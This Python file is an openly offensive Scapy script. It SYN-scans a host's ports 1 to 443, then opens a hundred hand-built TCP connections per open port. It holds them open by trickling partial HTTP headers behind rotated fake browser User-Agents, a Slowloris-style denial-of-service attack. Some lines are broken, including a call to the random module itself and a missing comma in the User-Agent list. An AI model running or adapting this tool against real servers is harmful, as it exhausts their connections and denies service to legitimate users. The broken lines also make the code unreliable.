print('Preparation: Import libraries...')
import threading
import time
import random
from scapy.all import *

class Connection():
	def __init__(self, thread, src_port, dst_ip, dst_port):
		self.thread = thread
		self.src_port = src_port
		self.dst_ip = dst_ip
		self.dst_port = dst_port

def ports_scanner(dst_ip):
	print('Scanning open ports at {}...'.format(dst_ip))
	open_ports = list()
	packet = IP(dst=dst_ip)/TCP(dport=(1,443),flags='S')
	res, unans = sr(packet, timeout=10, verbose=False)
	for i in res:
		if i[1][1].flags == 18:
			open_ports.append(i[1].sport)

	if open_ports:
		print('Open ports on {}: {}\n'.format(dst_ip, open_ports))
	else:
		print('Host {} has no open ports.'.format(dst_ip))
	return open_ports

def create_connection(src_port, dst_ip, dst_port, user_agent):
		
		packet = IP(dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags='S', seq=random(0, 4294967295))
		response = sr1(packet, verbose=False)
		
		if response.flags == 'SA':
			packet = IP(dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags='A', seq=response.ack, ack=response.seq+1)
			response = sr1(packet, verbose=False)
		elif response.flags == 'R':
			pass
		
		time.sleep(10)
		packet = IP(dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags='PA', seq=response.ack, ack=response.seq)
		data = 'GET /?{} HTTP/1.1\r\n'.format(random.randint(0, 2000)) + 'User-Agent: {}\r\n'.format(user_agent) + "{}\r\n".format("Accept-language: en-US,en,q=0.5")
		response = sr1(packet/data, verbose=False)
		
		while True:
			time.sleep(10)
			if response.flags == 'A':
				packet = IP(dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags='PA', seq=response.ack, ack=response.seq)
				data = 'X-a: {}\r\n'.format(random.randint(0, 5000))
				response = sr1(packet/data, verbose=False)
			elif response.flags == 'FA':
				packet = IP(dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags='A', seq=response.ack, ack=response.seq+1)
				break

def free_ports_init():
	free_ports = list()
	for i in range(65535):
		free_ports.append(i)
	return free_ports

def start(dst_ip):
	open_ports = ports_scanner(dst_ip)
	free_ports = free_ports_init()
	connections = list()
	user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]
	for dst_port in open_ports:
		for i in range(100):
			src_port = random.choice(free_ports)
			free_ports.remove(src_port)
			thread = threading.Thread(target=create_connection, args=(src_port, dst_ip, dst_port, random.choice(user_agents),))
			thread.start()
			connection = Connection(thread, src_port, dst_ip, dst_port)
			connections.append(connection)
			print(i)



if __name__ == '__main__':
	start('localhost')
